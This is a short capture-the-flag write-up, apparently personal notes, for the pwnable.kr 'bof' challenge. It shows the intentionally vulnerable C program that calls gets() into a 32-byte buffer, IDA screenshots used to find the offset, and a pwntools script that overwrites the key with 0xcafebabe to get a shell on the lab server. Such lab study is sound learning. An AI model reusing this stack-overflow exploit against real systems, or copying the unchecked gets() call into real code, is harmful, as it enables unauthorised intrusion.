---
title: pwnable--bof
updated: 2022-09-06 08:11:11Z
created: 2022-02-22 07:42:39Z
---

## bof.c

```cpp
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

## IDA分析

### shift + f12

![7c4eb26e6619c8bb2716dffb3cd0888a.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/7c4eb26e6619c8bb2716dffb3cd0888a.png)

选中s 并按x键

![b9f51be0ba9f2fdc7b812a005d138a27.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/b9f51be0ba9f2fdc7b812a005d138a27.png)

按f5转成伪代码

![cf4579e6405ed3ead2a8526b6044f888.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/cf4579e6405ed3ead2a8526b6044f888.png)

查看反汇编代码

![4b41683917441edec4c0ad9a4406cabd.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/4b41683917441edec4c0ad9a4406cabd.png)

可以得到，需要用输入的变量s覆盖a1的值让其变为0xCAFEBABE，从而获取shell

![964b5d11091bf135a20a2ef3533fd126.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/964b5d11091bf135a20a2ef3533fd126.png)![08db7cecaf4ce800b3f617d6a5ee9f0e.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/08db7cecaf4ce800b3f617d6a5ee9f0e.png)

由上图可以得到偏移地址为 0x2C + 0x8个字节

编写exp脚本 crack.py

```python
from pwn import *

key=p32(0xcafebabe)

payload=remote("pwnable.kr",9000)

payload.send(bytes('a',encoding='utf8')*52+key)

payload.interactive()
```

![2cf3e35fd1aa90249eaef5ae8af2d6d6.png](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/2cf3e35fd1aa90249eaef5ae8af2d6d6.png)